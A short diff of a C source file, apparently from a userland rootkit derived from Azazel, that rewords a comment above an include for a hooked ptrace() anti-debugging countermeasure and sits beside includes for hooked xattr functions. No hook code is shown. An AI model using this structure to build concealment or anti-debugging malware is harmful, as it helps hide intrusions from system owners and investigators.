@@ -129,8 +129,7 @@
 #include "symbols/xattr/remove/lremovexattr.c" // (int lremovexattr())
 #include "symbols/xattr/remove/fremovexattr.c" // (int fremovexattr())
 
-// libc ptrace() function - this was originally in Azazel as a debugging countermeasure, but I've adapted it slightly
-// so that it doesn't fuckin brick your box. by adapted I mean it's optional lolol
+// libc ptrace() function
 // http://man7.org/linux/man-pages/man2/ptrace.2.html
 #include "symbols/hiding/debug/ptrace.c" // (long ptrace())
 
